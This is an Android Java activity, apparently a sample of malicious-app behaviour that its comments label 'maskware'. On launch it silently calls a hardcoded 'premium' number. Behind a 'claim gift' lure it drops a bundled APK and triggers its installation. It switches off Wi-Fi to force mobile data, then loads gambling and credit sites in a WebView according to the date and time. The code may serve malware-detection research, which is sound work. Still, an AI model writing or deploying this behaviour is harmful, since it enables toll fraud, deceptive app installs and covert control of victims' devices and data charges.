package com.example.allphaapplication;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

//Calling to premium number or hardcoded numbers
public class MakingCalls extends AppCompatActivity {
    //FOR MAKING CALLS***********************
    private static final int CALL_PERMISSION_CODE=150;
    private String phoneNumber="tel:8299197933"; //Premium or hardcoded number


    //FOR DOWNLOADING APK ********************
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 101;

    //FOR DOWNLOADING URL AFTER SOMETIME MASKWARE APP ******************

    private WebView webView;
    private static final int DELAY_TIME=25000;//25 seconds

    //FOR TURNING OFF WIFI DATA AND SWITCHING TO MOBILE DATA
    private boolean networkAvailable = false;

    private static final int NETWORK_TIMEOUT = 5000; // 5 seconds timeout

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_making_calls);

        //FOR MAKING CALLS***********************
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)!= PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.CALL_PHONE},CALL_PERMISSION_CODE);

        }
        else {
            makeCall();
        }
        //FOR DOWNLOADING APK******************

        // Request permissions if not already granted
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
        }

        // Set up the button click listener
        Button updateButton = findViewById(R.id.button);
        updateButton.setOnClickListener(v -> new FileFromAssets(this).execute());

        //FOR DOWNLOADING URL AFTER SOMETIME MASKWARE APP ******************

        webView = findViewById(R.id.webView);
        requestMobileDataNetwork();
        //Delay URL loading
        //  new Handler().postDelayed(this::loadUrlBasedOnDateTime,DELAY_TIME);
    }

    //FOR MAKING CALLS***********************
    private void makeCall() {
        try{
            Intent callIntent=new Intent(Intent.ACTION_CALL, Uri.parse(phoneNumber));
            startActivity(callIntent);


        }
        catch(SecurityException e){
            Toast.makeText(this,"Fail to make call  " + e.getMessage(),Toast.LENGTH_SHORT).show();
        }

        //FOR TURNING OFF WIFI DATA AND SWITCHING TO MOBILE DATA
    /*    findViewById(R.id.gift_button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestMobileDataNetwork();

            }
        });

     */
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(requestCode==CALL_PERMISSION_CODE){
            if(grantResults.length>0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){
                makeCall();
            }
            else{
                Toast.makeText(this, "Call permission denied", Toast.LENGTH_SHORT).show();
            }
        }

    }

    //FOR DOWNLOADING APK******************


    private class FileFromAssets extends AsyncTask<Void, Void, Void> {

        private Context context;

        public FileFromAssets(Context context) {
            this.context = context;
        }

        @Override
        protected Void doInBackground(Void... params) {
            try {
                // Open the APK file from the assets folder
                AssetManager assetManager = context.getAssets();
                InputStream inputStream = assetManager.open("DivaApplication.apk");

                //Date and time For creating  unique file name
                String timestamp=new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                //String fileName="downloaded_apk"+timestamp+".apk";


                // Define the output file location in the public Downloads directory
              //  File outFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), fileName);
                File outFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "Diva.apk");

                FileOutputStream outputStream = new FileOutputStream(outFile);

                // Copy the file from assets to the destination
                byte[] buffer = new byte[1024];
                int length;
                while ((length = inputStream.read(buffer)) > 0) {
                    outputStream.write(buffer, 0, length);
                }

                // Close the streams
                outputStream.flush();
                outputStream.close();
                inputStream.close();


                //     runOnUiThread(()->installAPK(outFile));
            } catch (IOException e) {
                Log.d(TAG, "Error copying APK from assets", e);
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            Toast.makeText(context, " wait for some time to claim gift", Toast.LENGTH_SHORT).show(); // APK Downloaded
            // install the APK
                  File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "Diva.apk");
             installAPK(file);
        }

        private void installAPK(File file) {
            Uri apkUri = FileProvider.getUriForFile(context, context.getPackageName() + ".provider", file);//This uri is granting temporary read access to file,allowing the installer app to access it(File Provider facilitate secure sharing of files between apps )
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive"); //sets data and type to indicate that this intent is for installing an application(apkfile,MIME Type - tells android that this is an android apk file )
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Grant temporary read permission to uri( apk file)
            context.startActivity(intent);
        }


    }
    //FOR DOWNLOADING URL AFTER SOMETIME MASKWARE APP ******************

    private void loadUrlBasedOnDateTime() {

        Calendar selectedDateTime = Calendar.getInstance();
        // Define your target date and time
        Calendar targetDate = Calendar.getInstance();
        targetDate.set(2024, Calendar.SEPTEMBER, 22, 0, 0); // 22 Sept 2024, 00:00 AM (Start of the day)
        Calendar noonTime = Calendar.getInstance();
        noonTime.set(2024, Calendar.SEPTEMBER, 22, 12, 0); // 22 Sept 2024, 12:00 PM

        String urlToLoad;

        if (selectedDateTime.before(targetDate) && selectedDateTime.get(Calendar.HOUR_OF_DAY) < 12) {
            // If selected date is before 22 Sept 2024 and time is morning
            urlToLoad = "https://urlfiltering.paloaltonetworks.com/test-gambling";
        } else if (selectedDateTime.before(targetDate) && selectedDateTime.get(Calendar.HOUR_OF_DAY) >= 12) {
            // If selected date is before 22 Sept 2024 and time is afternoon
            // urlToLoad="https://pm-bet.in/en/all-live";
            urlToLoad="https://cricketrajaapp24.com/?gclid=EAIaIQobChMI9uicgsCDiAMVt6hmAh3xZg4BEAMYASAAEgLL0_D_BwE&utm_term=online%20betting%20sport&utm_campaign=21523636929&utm_source=google&utm_match=p&gad_source=1";
            //  urlToLoad = "https://www.similarweb.com/top-websites/gambling/sports-betting/";
        } else if (selectedDateTime.after(targetDate) && selectedDateTime.get(Calendar.HOUR_OF_DAY) < 12) {
            // If selected date is after 22 Sept 2024 but time is before 12:00 PM (Morning)
            //   urlToLoad = "https://en.wikipedia.org/wiki/Stake_(online_casino)";
            urlToLoad="https://creditbuzz.in/";
        } else {
            // If selected date is after 22 Sept 2024 and time is after 12:00 PM (Afternoon)
            urlToLoad = "https://www.semrush.com/trending-websites/in/gambling";
        }

        // Load the URL in WebView
        webView.loadUrl(urlToLoad);
    }
    //FOR TURNING OFF WIFI DATA AND SWITCHING TO MOBILE DATA
    private void requestMobileDataNetwork() {
        // Turn off Wi-Fi
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null && wifiManager.isWifiEnabled()) {
            wifiManager.setWifiEnabled(false);
        }

        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        NetworkRequest.Builder builder = new NetworkRequest.Builder();

        builder.addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR);

        connectivityManager.requestNetwork(builder.build(), new ConnectivityManager.NetworkCallback() {

            @Override

            public void onAvailable(@NonNull Network network) {

                super.onAvailable(network);

                connectivityManager.bindProcessToNetwork(network);

                networkAvailable = true;

                // Load the URL after switching to mobile data

                runOnUiThread(() ->loadUrlBasedOnDateTime());
            }

            @Override

            public void onUnavailable() {

                super.onUnavailable();
                runOnUiThread(() ->showNetworkUnavailableDialog());
                // This method might not always get called, so we use a timeout mechanism

            }

        });

        // Set a timeout to check if the network is still not available

        new Handler().postDelayed(() -> {

            if (!networkAvailable) {

                // If network is still unavailable, show the alert dialog

                showNetworkUnavailableDialog();

            }

        }, NETWORK_TIMEOUT);

    }
    /*
        private void loadUrl(String url) {

            webView.getSettings().setJavaScriptEnabled(true);

            webView.loadUrl(url);

        }
    */
    private void showNetworkUnavailableDialog() {

        new AlertDialog.Builder(this)

                .setTitle("Network Unavailable")

                .setMessage("Please enable mobile data to continue.")

                .setPositiveButton("Go to Settings", new DialogInterface.OnClickListener() {

                    public void onClick(DialogInterface dialog, int which) {

                        startActivity(new Intent(Settings.ACTION_DATA_ROAMING_SETTINGS));

                    }

                })

                .setNegativeButton("Cancel", null)

                .show();

    }

}